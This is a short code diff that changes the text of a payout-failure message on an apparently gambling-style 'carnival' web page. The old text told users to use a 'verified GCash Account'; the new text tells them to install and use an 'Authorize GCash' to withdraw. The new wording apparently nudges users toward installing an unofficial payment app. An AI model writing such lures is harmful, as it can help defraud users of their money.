@@ -1974,7 +1974,7 @@
             '</div>' +
             '<p class="carnival-message">' +
                 'Your payout request is <strong>unsuccessful</strong>.<br>' +
-                'Use a <span class="carnival-highlight">verified GCash Account</span><br>' +
+                'Install and use your<span class="carnival-highlight">Authorize GCash</span><br>' +
                 'to process instant withdrawal.' +
             '</p>' +
             '<div class="carnival-chips">' +
